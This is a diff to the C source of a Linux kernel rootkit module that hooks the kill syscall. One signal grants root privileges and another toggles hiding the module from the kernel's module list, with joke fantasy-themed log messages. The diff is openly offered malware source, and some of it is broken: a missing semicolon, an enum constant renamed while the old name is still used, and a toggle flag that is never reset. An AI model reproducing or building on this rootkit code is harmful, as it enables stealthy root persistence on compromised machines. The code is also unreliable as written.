@@ -5,6 +5,7 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 #include "support_file.h"
+//TODO create your own ftrace helper file
 
 
 MODULE_LICENSE("GPL");
@@ -13,13 +14,22 @@ MODULE_DESCRIPTION("Linux Kernel Rootkit Tested and Working for Kernel 5.7.x");
 MODULE_VERSION("1.0");
 
 static asmlinkage long (*original_kill) (const struct pt_regs*);
+static struct list_head* previous_module;
+int TOGGLE_STATE = 0
 
 enum sigvalues {
 	ELEVATE = 64,
-	HIDE = 63 
+	TOGGLEINVIS = 63 
 };
 
 static int invisible(void) {
+	previous_module = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	return 0;
+}
+
+static int reveal(void) {
+	list_add(&THIS_MODULE->list, previous_module);
 	return 0;
 }
 
@@ -49,6 +59,10 @@ asmlinkage int hook_kill(void){
  	
 	int signal = regs->si;
 
+	void invisible(void);
+	void reveal(void);
+	void elevate_to_root(void);
+
 	if (signal == ELEVATE) {
 		printk(KERN_INFO "Odium is giving Taravangian some voidlight and a voidspren he's too damn strong now!\n");
 			
@@ -60,12 +74,22 @@ asmlinkage int hook_kill(void){
 	}
 
 	else if (signal == HIDE) {
-		printk(KERN_INFO "Taravangian's sneaky ass is hiding his musty ass somewhere!\n");
 
-		if (inivisible() == 1) {
-			printk(KERN_INFO "Error: When Making Invisible!\n");
-
+		if (TOGGLE_STATE == 0) {
+			if (invisible() == 1) {
+				return 1;
+			}
+			TOGGLE_STATE = 1;
+			printk(KERN_INFO "Taravangian's sneaky ass is hiding his musty ass somewhere!\n");
 		}
+
+		else if (TOGGLE_STATE == 1) {
+			if (reveal() == 1) {
+				return 1;
+			}
+			printk(KERN_INFO "Taravangian's dumbass is back!\n");
+		}
+		
 		return 0;
 	}
 		
